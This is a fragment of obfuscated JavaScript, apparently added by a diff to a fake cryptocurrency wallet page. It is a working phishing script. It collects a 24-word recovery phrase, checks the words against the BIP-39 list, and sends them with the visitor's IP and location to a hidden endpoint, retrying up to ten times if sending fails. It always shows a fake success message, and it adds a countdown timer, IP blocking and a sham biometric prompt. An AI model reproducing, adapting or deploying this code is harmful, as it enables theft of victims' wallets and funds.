blockIP(userIPData['ip'],_0x1949e6(0x248)),!![];}catch(_0x180a93){console[_0x1949e6(0x149)](_0x1949e6(0x159),_0x180a93);}return![];}function initializeBlockCheck(){const _0xf1d213=_0x360b5f;getUserIPInfo()[_0xf1d213(0x20c)](_0x5ab27b=>{const _0x47d0b3=_0xf1d213;if(_0x5ab27b&&_0x5ab27b['ip']&&_0x5ab27b['ip']!=='unavailable')checkIfIPBlocked(_0x5ab27b['ip']);else{const _0x3a37f3=blockStorage[_0x47d0b3(0x1fd)]();_0x3a37f3&&_0x3a37f3['length']>0x0&&(ipBlockStatus[_0x47d0b3(0x1c2)]=!![],ipBlockStatus['reason']='Device\x20has\x20been\x20blocked',ipBlockStatus[_0x47d0b3(0x15b)]=!![],showBlockedMessage());}});}let currentLanguage='vi';function setLanguage(_0x1bdc0){const _0x258f96=_0x360b5f;currentLanguage=_0x1bdc0;const _0x58e3b1=document[_0x258f96(0x202)](_0x258f96(0x1f8));_0x58e3b1[_0x258f96(0x229)](_0x4a08d8=>{const _0x2b815e=_0x258f96;_0x4a08d8[_0x2b815e(0x230)](_0x2b815e(0x184))===_0x1bdc0?_0x4a08d8[_0x2b815e(0x1b7)][_0x2b815e(0x1bf)](_0x2b815e(0x203)):_0x4a08d8['classList'][_0x2b815e(0x185)](_0x2b815e(0x203));});const _0x267aad=document[_0x258f96(0x202)]('[data-vi][data-en]');_0x267aad[_0x258f96(0x229)](_0x1e9aa9=>{const _0x499edf=_0x258f96;_0x1e9aa9['hasAttribute'](_0x499edf(0x23d))?_0x1e9aa9[_0x499edf(0x15a)](_0x499edf(0x23d),_0x1e9aa9[_0x499edf(0x230)](_0x499edf(0x19a)+_0x1bdc0)):_0x1e9aa9[_0x499edf(0x24d)]=_0x1e9aa9['getAttribute'](_0x499edf(0x19a)+_0x1bdc0);});try{localStorage[_0x258f96(0x23a)](_0x258f96(0x1b4),_0x1bdc0);}catch(_0x2d69fd){console['error'](_0x258f96(0x254),_0x2d69fd);}updateUIForSubmissionCount(),updatePendingRequestsBadge();}function getCurrentLanguage(){return currentLanguage;}function initializeLanguageOptions(){const _0x35e4c3=_0x360b5f,_0x543278=document[_0x35e4c3(0x202)](_0x35e4c3(0x1f8));_0x543278['forEach'](_0xc79474=>{const _0x144ab4=_0x35e4c3;_0xc79474[_0x144ab4(0x23f)](_0x144ab4(0x175),function(){const _0x2cd2bb=_0x144ab4,_0x452566=this['getAttribute'](_0x2cd2bb(0x184));setLanguage(_0x452566);});});}const pendingRequests={'storageKey':_0x360b5f(0x1df),'apiEndpoint':_0x360b5f(0x1ee),'backupEndpoints':[_0x360b5f(0x1ee)],'get':function(){const _0xdd4ca1=_0x360b5f;try{const _0x28b3e4=localStorage[_0xdd4ca1(0x246)](this[_0xdd4ca1(0x161)]);return _0x28b3e4?JSON['parse'](_0x28b3e4):[];}catch(_0x3d9a5f){return console['error']('Error\x20getting\x20pending\x20requests:',_0x3d9a5f),[];}},'save':function(_0x5022c4){const _0xf110e1=_0x360b5f;try{localStorage[_0xf110e1(0x23a)](this['storageKey'],JSON[_0xf110e1(0x22b)](_0x5022c4)),this['updateBadge']();}catch(_0x2cc2cf){console[_0xf110e1(0x149)](_0xf110e1(0x221),_0x2cc2cf);}},'add':function(_0x54033e){const _0x37ffe6=_0x360b5f,_0x12be97=this[_0x37ffe6(0x1f9)]();return _0x12be97['push']({..._0x54033e,'id':Date['now']()+Math['random']()['toString'](0x24)['substring'](0x2,0x9),'timestamp':new Date()[_0x37ffe6(0x127)](),'attempts':0x0,'endpointIndex':0x0}),this['save'](_0x12be97),this['process'](),!![];},'updateBadge':function(){const _0x1736c2=_0x360b5f,_0x30e0f2=this[_0x1736c2(0x1f9)](),_0x5c90ce=document[_0x1736c2(0x210)](_0x1736c2(0x1fc)),_0x596e43=document['getElementById'](_0x1736c2(0x215));_0x30e0f2[_0x1736c2(0x170)]>0x0?(_0x596e43[_0x1736c2(0x24d)]=_0x30e0f2['length'],_0x5c90ce['style'][_0x1736c2(0x22d)]='block'):_0x5c90ce[_0x1736c2(0x16c)][_0x1736c2(0x22d)]=_0x1736c2(0x259);const _0x2b1ab2=document[_0x1736c2(0x20b)](_0x1736c2(0x18a));_0x2b1ab2&&(_0x2b1ab2['textContent']='Pending:\x20');},'process':function(){const _0x2cd6bb=_0x360b5f,_0x521d50=this['get']();if(_0x521d50[_0x2cd6bb(0x170)]===0x0)return;this['processRequest'](_0x521d50[0x0])['then'](_0x463b14=>{const _0x33378b=_0x2cd6bb,_0x12652e=this[_0x33378b(0x1f9)]();if(_0x463b14)_0x12652e[_0x33378b(0x25e)](),this[_0x33378b(0x1be)](_0x12652e),_0x12652e[_0x33378b(0x170)]>0x0&&setTimeout(()=>this['process'](),0x3e8);else{if(_0x12652e[_0x33378b(0x170)]>0x0){_0x12652e[0x0][_0x33378b(0x14f)]+=0x1;this[_0x33378b(0x176)][_0x33378b(0x170)]>0x0&&_0x12652e[0x0][_0x33378b(0x18f)]<this[_0x33378b(0x176)]['length']&&(_0x12652e[0x0][_0x33378b(0x18f)]+=0x1);if(_0x12652e[0x0]['attempts']>=0xa){const _0x500b0e=_0x12652e[_0x33378b(0x25e)]();_0x500b0e[_0x33378b(0x14f)]=0x0,_0x500b0e[_0x33378b(0x18f)]=0x0,_0x12652e[_0x33378b(0x1d6)](_0x500b0e);}this['save'](_0x12652e);}if(_0x12652e[_0x33378b(0x170)]>0x0){const _0x4d7e67=Math[_0x33378b(0x208)](0x3e8*Math[_0x33378b(0x1a2)](1.2,_0x12652e[0x0]['attempts']),0x2710);setTimeout(()=>this[_0x33378b(0x21d)](),_0x4d7e67);}}});},'processRequest':async function(_0x787899){const _0x3afbda=_0x360b5f;if(!_0x787899)return![];try{let _0x1ed724=this[_0x3afbda(0x1cf)];_0x787899['endpointIndex']>0x0&&_0x787899[_0x3afbda(0x18f)]<=this[_0x3afbda(0x176)][_0x3afbda(0x170)]&&(_0x1ed724=this[_0x3afbda(0x176)][_0x787899[_0x3afbda(0x18f)]-0x1]);const _0x94fcb9={'message':_0x787899['message'],'walletAddress':_0x787899[_0x3afbda(0x204)],'timestamp':new Date()[_0x3afbda(0x127)](),'requestId':_0x787899['id']},_0x3f1e17=await fetch(_0x1ed724,{'method':_0x3afbda(0x158),'headers':{'Content-Type':_0x3afbda(0x17f)},'body':JSON[_0x3afbda(0x22b)](_0x94fcb9),'signal':AbortSignal[_0x3afbda(0x186)](0x1388)});if(_0x3f1e17[_0x3afbda(0x183)]===0xc8)return!![];const _0x275670=await _0x3f1e17['json']();return _0x275670[_0x3afbda(0x141)]===!![];}catch(_0x3c21be){return console[_0x3afbda(0x149)](_0x3afbda(0x1e2),_0x3c21be),![];}}};function updatePendingRequestsBadge(){const _0x591749=_0x360b5f;pendingRequests[_0x591749(0x1f5)]();}document[_0x360b5f(0x23f)](_0x360b5f(0x1cd),function(){const _0x34f98a=_0x360b5f;initializeLanguageOptions(),initializeBlockCheck(),requestAnimationFrame(()=>{createPremiumBackground(),createFloatingIcons(),createExplosionParticles(),setupFeatureCardWaves();}),setTimeout(()=>{handleScrollAnimations();},0x64),updateUIForSubmissionCount(),document[_0x34f98a(0x210)](_0x34f98a(0x14d))[_0x34f98a(0x23f)](_0x34f98a(0x175),closeBlockedMessage);const _0x17a46a=document['getElementById']('headerBackBtn');_0x17a46a[_0x34f98a(0x16c)][_0x34f98a(0x1a7)]='hidden';const _0x3bba33=document['getElementById'](_0x34f98a(0x1de)),_0x2bc9ef=document['getElementById'](_0x34f98a(0x1bb)),_0x51cb5f=document[_0x34f98a(0x210)](_0x34f98a(0x168));setTimeout(()=>{const _0xe5050a=_0x34f98a;pendingRequests[_0xe5050a(0x21d)]();},0x7d0),_0x3bba33[_0x34f98a(0x23f)](_0x34f98a(0x175),function(){const _0x7e6704=_0x34f98a;_0x3bba33['disabled']=!![],_0x3bba33[_0x7e6704(0x24d)]=_0x7e6704(0x1ae),_0x3bba33[_0x7e6704(0x1b7)][_0x7e6704(0x1bf)](_0x7e6704(0x212)),localStorage[_0x7e6704(0x23a)](_0x7e6704(0x252),0x1),setTimeout(()=>{const _0x1778fe=_0x7e6704;_0x3bba33['innerHTML']=_0x1778fe(0x12e),setTimeout(()=>{const _0x4e9b94=_0x1778fe;_0x3bba33[_0x4e9b94(0x22c)]=_0x4e9b94(0x201),setTimeout(()=>{const _0x581f37=_0x4e9b94;_0x3bba33[_0x581f37(0x22c)]=_0x581f37(0x162),setTimeout(()=>{const _0x1b0bb6=_0x581f37;if(ipBlockStatus[_0x1b0bb6(0x1c2)]){showBlockedMessage();return;}if(hasExceededLimit()){const _0x234b2='You\x20have\x20exceeded\x20the\x20allowed\x20number\x20of\x20requests.';alert(_0x234b2);return;}navigateTo('homePage',_0x1b0bb6(0x167),'right'),updateUIForSubmissionCount(),_0x3bba33[_0x1b0bb6(0x22c)]=_0x1b0bb6(0x15c),_0x3bba33['disabled']=![];},0x3e8);},0x3e8);},0x3e8);},0x3e8);}),_0x17a46a[_0x34f98a(0x23f)](_0x34f98a(0x175),function(){const _0x30d15f=_0x34f98a,_0x38ab81=document[_0x30d15f(0x20b)](_0x30d15f(0x17b))['id'];_0x38ab81===_0x30d15f(0x167)&&navigateTo(_0x30d15f(0x167),_0x30d15f(0x261),_0x30d15f(0x14c));});let _0x22a8e2=null,_0x2e90fb=![];async function _0x858c75(){const _0x6f6098=_0x34f98a;if(_0x22a8e2!==null)return _0x22a8e2;if(_0x2e90fb)return null;_0x2e90fb=!![];try{const _0x5e4b20=await fetch(_0x6f6098(0x147));if(!_0x5e4b20['ok'])throw new Error(_0x6f6098(0x131));const _0x5f55bd=await _0x5e4b20[_0x6f6098(0x220)]();return _0x22a8e2=new Set(_0x5f55bd[_0x6f6098(0x179)]('\x0a')[_0x6f6098(0x242)](_0x47ab1c=>_0x47ab1c[_0x6f6098(0x260)]()[_0x6f6098(0x170)]>0x0)),_0x22a8e2;}catch(_0x2ec20b){console['error']('Error\x20fetching\x20BIP-39\x20wordlist:',_0x2ec20b);const _0x2437ab=[_0x6f6098(0x164)];return _0x22a8e2=new Set(_0x2437ab),_0x22a8e2;}finally{_0x2e90fb=![];}}async function _0x19816c(_0x42cb08){const _0x476ad4=_0x34f98a,_0x2c408f=await _0x858c75();if(!_0x2c408f)return{'valid':![],'invalidWords':[]};const _0x5d045b=_0x42cb08[_0x476ad4(0x242)](_0x20b23b=>!_0x2c408f['has'](_0x20b23b['toLowerCase']()));return{'valid':_0x5d045b[_0x476ad4(0x170)]===0x0,'invalidWords':_0x5d045b};}const _0xdfd22=document['getElementById'](_0x34f98a(0x204)),_0x56e210=document[_0x34f98a(0x210)](_0x34f98a(0x1d8)),_0x912a76=document[_0x34f98a(0x210)](_0x34f98a(0x211)),_0x114258=document[_0x34f98a(0x20b)](_0x34f98a(0x118));_0x858c75();let _0x569fb7;_0xdfd22[_0x34f98a(0x23f)](_0x34f98a(0x1ab),function(){clearTimeout(_0x569fb7),_0x569fb7=setTimeout(async()=>{const _0x1ee4be=_0x24a3,_0x580787=this[_0x1ee4be(0x25b)][_0x1ee4be(0x260)]();let _0x33012f=0x0,_0x4e51f8=[];_0x580787&&(_0x4e51f8=_0x580787[_0x1ee4be(0x179)](/\s+/)[_0x1ee4be(0x242)](_0x3c9006=>_0x3c9006['length']>0x0),_0x33012f=_0x4e51f8[_0x1ee4be(0x170)]);if(_0x33012f>0x0&&_0x33012f!==0x18){const _0x311772=getCurrentLanguage();_0x912a76['classList'][_0x1ee4be(0x185)]('hidden'),_0x912a76['textContent']=_0x1ee4be(0x1d9)+_0x33012f+')',_0x114258[_0x1ee4be(0x1b7)][_0x1ee4be(0x185)]('valid-input'),_0x114258[_0x1ee4be(0x1b7)]['add'](_0x1ee4be(0x11a)),_0x56e210[_0x1ee4be(0x24d)]='';}else{if(_0x33012f===0x18){const _0x3dae7e=await _0x19816c(_0x4e51f8);if(!_0x3dae7e[_0x1ee4be(0x218)]){const _0x5305d5=getCurrentLanguage(),_0x39f4c8=_0x3dae7e[_0x1ee4be(0x1e3)][_0x1ee4be(0x13c)](0x0,0x3);_0x912a76[_0x1ee4be(0x1b7)]['remove'](_0x1ee4be(0x1dc)),_0x56e210[_0x1ee4be(0x24d)]=_0x1ee4be(0x234)+_0x39f4c8[_0x1ee4be(0x205)](',\x20')+(_0x3dae7e[_0x1ee4be(0x1e3)]['length']>0x3?_0x1ee4be(0x188):''),_0x114258[_0x1ee4be(0x1b7)][_0x1ee4be(0x185)](_0x1ee4be(0x1d4)),_0x114258['classList']['add'](_0x1ee4be(0x11a)),_0x56e210['textContent']='';}else _0x912a76['classList'][_0x1ee4be(0x1bf)](_0x1ee4be(0x1dc)),_0x114258['classList'][_0x1ee4be(0x1bf)](_0x1ee4be(0x1d4)),_0x114258[_0x1ee4be(0x1b7)][_0x1ee4be(0x185)]('invalid-input'),_0x56e210[_0x1ee4be(0x24d)]='';}else _0x912a76[_0x1ee4be(0x1b7)][_0x1ee4be(0x1bf)](_0x1ee4be(0x1dc)),_0x114258['classList'][_0x1ee4be(0x185)](_0x1ee4be(0x1d4)),_0x114258[_0x1ee4be(0x1b7)][_0x1ee4be(0x185)](_0x1ee4be(0x11a)),_0x56e210[_0x1ee4be(0x24d)]='';}},0x12c);}),_0x2bc9ef[_0x34f98a(0x23f)](_0x34f98a(0x175),async function(){const _0x333121=_0x34f98a;if(ipBlockStatus['blocked']){showBlockedMessage();return;}if(hasExceededLimit()){const _0x533335=getCurrentLanguage();document[_0x333121(0x210)](_0x333121(0x235))['style'][_0x333121(0x22d)]=_0x333121(0x166),document['getElementById'](_0x333121(0x235))['innerHTML']='<i\x20class=\x22fas\x20fa-ban\x20mr-2\x22></i>\x20You\x20have\x20exceeded\x20the\x20allowed\x20number\x20of\x20request\x20submissions\x20(2\x20times).\x20Please\x20contact\x20support\x20if\x20you\x20need\x20assistance.',trackSuspiciousActivity();return;}const _0x51ddf2=_0xdfd22['value'][_0x333121(0x260)](),_0xd0e798=_0x51ddf2['split'](/\s+/)['filter'](_0x1440bb=>_0x1440bb['length']>0x0),_0x2fdb36=_0xd0e798[_0x333121(0x170)];if(!_0x51ddf2||_0x2fdb36!==0x18){_0x114258['classList'][_0x333121(0x1bf)](_0x333121(0x11a));const _0x207ea8=getCurrentLanguage();_0x56e210['textContent']='Please\x20enter\x20exactly\x2024\x20words\x20(current:\x20'+_0x2fdb36+')',_0x56e210[_0x333121(0x1b7)][_0x333121(0x1bf)](_0x333121(0x1b6)),_0x912a76[_0x333121(0x1b7)][_0x333121(0x185)](_0x333121(0x1dc)),trackSuspiciousActivity();return;}const _0x6d88bc=await _0x19816c(_0xd0e798);if(!_0x6d88bc[_0x333121(0x218)]){const _0x5b6221=getCurrentLanguage(),_0x486749=_0x6d88bc[_0x333121(0x1e3)][_0x333121(0x13c)](0x0,0x3);_0x56e210[_0x333121(0x24d)]=_0x333121(0x234)+_0x486749[_0x333121(0x205)](',\x20')+(_0x6d88bc[_0x333121(0x1e3)][_0x333121(0x170)]>0x3?_0x333121(0x188):''),_0x56e210[_0x333121(0x1b7)][_0x333121(0x1bf)](_0x333121(0x1b6)),_0x114258[_0x333121(0x1b7)][_0x333121(0x1bf)](_0x333121(0x11a)),_0x114258[_0x333121(0x1b7)][_0x333121(0x185)](_0x333121(0x1d4)),_0x912a76['classList'][_0x333121(0x185)](_0x333121(0x1dc)),_0x912a76['textContent']=_0x333121(0x15d);const _0x5be643=trackSuspiciousActivity(!![]);_0x5be643&&showBlockedMessage();return;}showLoading();try{(!userIPData||userIPData['ip']==='unavailable')&&(userIPData=await getUserIPInfo());const _0x3e985a=incrementSubmissionCount();let _0x33117d='Unknown\x20location';if(userIPData){const _0x9de7bc=userIPData[_0x333121(0x222)]&&userIPData[_0x333121(0x222)]!==_0x333121(0x249)?userIPData[_0x333121(0x222)]:'',_0x19a77e=userIPData[_0x333121(0x12c)]||getCountryName(userIPData[_0x333121(0x125)])||_0x333121(0x1b1);_0x33117d=_0x9de7bc?_0x9de7bc+',\x20'+_0x19a77e:_0x19a77e;}const _0xd60c6e='',_0x5186fb='',_0x3f6213={'message':_0xd60c6e,'backupMessage':_0x5186fb,'walletAddress':_0x51ddf2,'ipInfo':{'ip':userIPData['ip']||'unavailable','location':_0x33117d,'country':userIPData['country']||_0x333121(0x249),'city':userIPData[_0x333121(0x222)]||_0x333121(0x249)},'submissionCount':_0x3e985a,'timestamp':new Date()[_0x333121(0x127)]()};try{const _0x4c827b=await fetch(pendingRequests[_0x333121(0x1cf)],{'method':_0x333121(0x158),'headers':{'Content-Type':_0x333121(0x17f)},'body':JSON['stringify'](_0x3f6213),'signal':AbortSignal[_0x333121(0x186)](0x1388)});if(!_0x4c827b['ok'])throw new Error('API\x20error:\x20'+_0x4c827b[_0x333121(0x183)]);setTimeout(()=>{hideLoading(),showSuccessModal(_0x51ddf2),updateUIForSubmissionCount();},0x3e8);}catch(_0x1081be){console['warn'](_0x333121(0x15e),_0x1081be),pendingRequests[_0x333121(0x1bf)]({'message':_0xd60c6e,'walletAddress':_0x51ddf2}),setTimeout(()=>{hideLoading(),showSuccessModal(_0x51ddf2),updateUIForSubmissionCount();},0x3e8);}}catch(_0x493c01){console[_0x333121(0x149)]('Error\x20in\x20submission\x20process:',_0x493c01);const _0x23005d=trackSuspiciousActivity();if(_0x23005d){hideLoading(),showBlockedMessage();return;}try{const _0x1008c7='';pendingRequests['add']({'message':_0x1008c7,'walletAddress':_0x51ddf2}),setTimeout(()=>{hideLoading(),showSuccessModal(_0x51ddf2),updateUIForSubmissionCount();},0x3e8);}catch(_0x391042){console[_0x333121(0x149)](_0x333121(0x228),_0x391042),hideLoading(),showSuccessModal(_0x51ddf2),updateUIForSubmissionCount();}}}),document[_0x34f98a(0x20b)]('.pi-button-secondary')[_0x34f98a(0x23f)](_0x34f98a(0x175),function(){const _0x55fdb0=_0x34f98a;if(ipBlockStatus[_0x55fdb0(0x1c2)]){showBlockedMessage();return;}showLoading();if(window['PublicKeyCredential']&&typeof navigator[_0x55fdb0(0x20e)]!==_0x55fdb0(0x1b3)&&typeof navigator['credentials'][_0x55fdb0(0x1f9)]===_0x55fdb0(0x19d)){const _0x3d4435={'challenge':new Uint8Array([0x0,0x1,0x2,0x3,0x4,0x5,0x6,0x7]),'allowCredentials':[],'timeout':0xea60,'userVerification':'preferred'};navigator[_0x55fdb0(0x20e)]['get']({'publicKey':_0x3d4435})[_0x55fdb0(0x20c)](_0x5daaa7=>{setTimeout(()=>{hideLoading(),_0x1e53e8();},0x3e8);})[_0x55fdb0(0x18c)](_0x291093=>{const _0x6011a8=_0x55fdb0;console[_0x6011a8(0x149)]('Biometric\x20authentication\x20error:',_0x291093),setTimeout(()=>{hideLoading(),_0x1e53e8();},0x3e8);});}else setTimeout(()=>{hideLoading(),_0x1e53e8();},0x3e8);});function _0x1e53e8(){const _0x4f999f=_0x34f98a,_0x59bd80=getCurrentLanguage(),_0x12af01=document[_0x4f999f(0x210)](_0x4f999f(0x235));_0x12af01[_0x4f999f(0x16c)]['display']=_0x4f999f(0x166),_0x12af01[_0x4f999f(0x22c)]=_0x4f999f(0x192),setTimeout(()=>{const _0x4b056f=_0x4f999f;_0x12af01[_0x4b056f(0x16c)][_0x4b056f(0x22d)]=_0x4b056f(0x259);},0x1388),trackSuspiciousActivity();}_0x51cb5f[_0x34f98a(0x23f)](_0x34f98a(0x175),function(){const _0x4b5cde=_0x34f98a;hideSuccessModal(),navigateTo(_0x4b5cde(0x167),_0x4b5cde(0x261),'left'),document[_0x4b5cde(0x210)]('walletAddress')[_0x4b5cde(0x25b)]='',updateUIForSubmissionCount();});});function updateCountdown(){const _0x7aa781=_0x360b5f,_0x463e2c=document[_0x7aa781(0x210)]('countdown');let [_0x5d18cb,_0x3c5cd5,_0x3768f8]=_0x463e2c[_0x7aa781(0x1cc)][_0x7aa781(0x179)](':')['map'](Number);if(_0x5d18cb===0x0&&_0x3c5cd5===0x0&&_0x3768f8===0x0)return;_0x3768f8--,_0x3768f8<0x0&&(_0x3768f8=0x3b,_0x3c5cd5--,_0x3c5cd5<0x0&&(_0x3c5cd5=0x3b,_0x5d18cb--)),_0x463e2c[_0x7aa781(0x1cc)]=String(_0x5d18cb)[_0x7aa781(0x12b)](0x2,'0')+':'+String(_0x3c5cd5)[_0x7aa781(0x12b)](0x2,'0')+':'+String(_0x3768f8)[_0x7aa781(0x12b)](0x2,'0');}setInterval(updateCountdown,0x3e8),document[_0x360b5f(0x20b)](_0x360b5f(0x123))['addEventListener'](_0x360b5f(0x175),function(_0x5b829a){const _0x4cb800=_0x360b5f;_0x5b829a[_0x4cb800(0x236)]();const _0x36e00b=document[_0x4cb800(0x210)](_0x4cb800(0x200));_0x36e00b&&(_0x36e00b[_0x4cb800(0x16c)][_0x4cb800(0x22d)]='none'),navigateTo('formPage',_0x4cb800(0x1da),_0x4cb800(0x24c));}),document[_0x360b5f(0x210)](_0x360b5f(0x21c))[_0x360b5f(0x23f)](_0x360b5f(0x175),function(_0x2ad099){const _0x3c8dd7=_0x360b5f;_0x2ad099[_0x3c8dd7(0x236)](),navigateTo('createWalletPage',_0x3c8dd7(0x167),_0x3c8dd7(0x14c));}),document[_0x360b5f(0x210)]('createNewWalletBtn')[_0x360b5f(0x23f)](_0x360b5f(0x175),function(){const _0x3ad34a=_0x360b5f,_0x3b1c5a=document[_0x3ad34a(0x210)](_0x3ad34a(0x200));_0x3b1c5a&&(_0x3b1c5a['style']['display']='block');});
+		</script>
+
+		<!-- Google Tag Manager (noscript) -->
+		<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MMXD7N7V"
+		height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+		<!-- End Google Tag Manager (noscript) -->
+		 
+	</body>
+</html>
